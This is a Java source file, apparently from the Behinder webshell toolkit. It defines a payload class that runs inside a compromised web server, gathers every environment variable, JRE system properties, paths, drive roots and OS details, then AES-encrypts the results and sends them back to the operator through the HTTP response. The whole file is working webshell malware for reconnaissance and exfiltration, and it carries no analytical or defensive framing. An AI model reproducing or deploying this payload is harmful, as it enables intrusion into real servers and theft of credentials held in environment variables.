package net.rebeyond.behinder.payload.java;

import java.io.File;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class BasicInfo {
    public static String whatever;
    private Object Request;
    private Object Response;
    private Object Session;

    public boolean equals(Object obj) {
        try {
            fillContext(obj);
            StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量:</font><br/>");
            Map<String, String> env = System.getenv();
            for (String name : env.keySet()) {
                basicInfo.append(name + "=" + env.get(name) + "<br/>");
            }
            basicInfo.append("<br/><font size=2 color=red>JRE系统属性:</font><br/>");
            for (Map.Entry<Object, Object> entry : System.getProperties().entrySet()) {
                basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
            }
            String currentPath = new File("").getAbsolutePath();
            String driveList = "";
            File[] roots = File.listRoots();
            for (int i = 0; i < roots.length; i++) {
                driveList = driveList + roots[i].getPath() + ";";
            }
            Map<String, String> entity = new HashMap<>();
            entity.put("basicInfo", basicInfo.toString());
            entity.put("currentPath", currentPath);
            entity.put("driveList", driveList);
            entity.put("osInfo", System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch"));
            entity.put("arch", System.getProperty("os.arch"));
            String result = buildJson(entity, true);
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so.getClass().getMethod("write", byte[].class).invoke(so, Encrypt(result.getBytes("UTF-8")));
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                return true;
            } catch (Exception e) {
                return true;
            }
        } catch (Exception e2) {
            try {
                Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so2.getClass().getMethod("write", byte[].class).invoke(so2, Encrypt("".getBytes("UTF-8")));
                so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
                return true;
            } catch (Exception e3) {
                return true;
            }
        } catch (Throwable th) {
            try {
                Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so3.getClass().getMethod("write", byte[].class).invoke(so3, Encrypt("".getBytes("UTF-8")));
                so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
            } catch (Exception e4) {
            }
            throw th;
        }
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString().getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
}
